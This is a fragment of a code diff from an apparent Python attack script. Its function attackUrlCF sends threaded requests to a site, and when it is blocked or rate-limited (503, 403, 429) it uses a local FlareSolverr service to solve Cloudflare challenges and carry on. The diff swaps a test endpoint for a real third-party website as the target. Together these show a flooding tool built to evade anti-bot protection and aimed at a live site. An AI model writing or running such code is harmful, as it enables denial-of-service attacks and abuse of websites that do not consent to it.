@@ -118,7 +118,7 @@ def attackUrlCF(baseUrl, threadNumber):
 			# print('threadNum: ' + str(threadNumber))
 			# print(res[0].content)
 			if str(res[0].status_code) in ['503', '403', '429']:
-				print(str(threadNumber), 'blockeddd')
+				print(str(threadNumber), 'blockeddd', res[0].content)
 				cookiesStr, userAgent, proxies = solveChanellnge(baseUrl)
 				print(str(threadNumber), 'resolved')
 			
@@ -135,7 +135,7 @@ def attackAll():
 flareSolverUrl = 'http://localhost:8191/v1'
 
 for i in range(1):
-	Thread(target=attackUrlCF, args=['https://api.ipify.org', i]).start()
+	Thread(target=attackUrlCF, args=['https://www.business2community.com', i]).start()
 	time.sleep(30)
 input()
 
